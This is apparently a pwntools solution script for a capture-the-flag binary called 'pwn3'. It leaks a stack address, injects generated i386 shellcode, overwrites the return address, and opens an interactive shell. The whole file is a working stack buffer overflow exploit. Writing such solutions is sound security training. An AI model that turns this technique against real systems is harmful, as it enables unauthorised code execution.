from pwn import *

context.update(arch='i386', os='linux')
context.terminal = ['konsole', '-e']
# target = process('./pwn3')
target = gdb.debug('./pwn3', gdbscript='b *echo + 56')

# Print out the text, up to the address of the start of our input
print(target.recvuntil(b"journey "))

# Scan in the rest of the line
leak = target.recvline()

# Strip away the characters not part of our address
shellcodeAdr = int(leak.strip(b"!\n"), 16)
print(shellcodeAdr)

# Make the payload
# The original shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
# works on Ubuntu 20.04 but fails on Arch Linux, so I gen shellcode using pwntools
shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode
# Pad the rest of the space to the return address with zeroes
payload += b"0"*(0x12e - len(payload))
# Overwrite the return address with the leaked address which points to the start of our shellcode
payload += p32(shellcodeAdr)
print(payload)

# Send the payload
# gdb.attach(target)
target.sendline(payload)

# Drop to an interactive shell to use our newly popped shell
target.interactive()
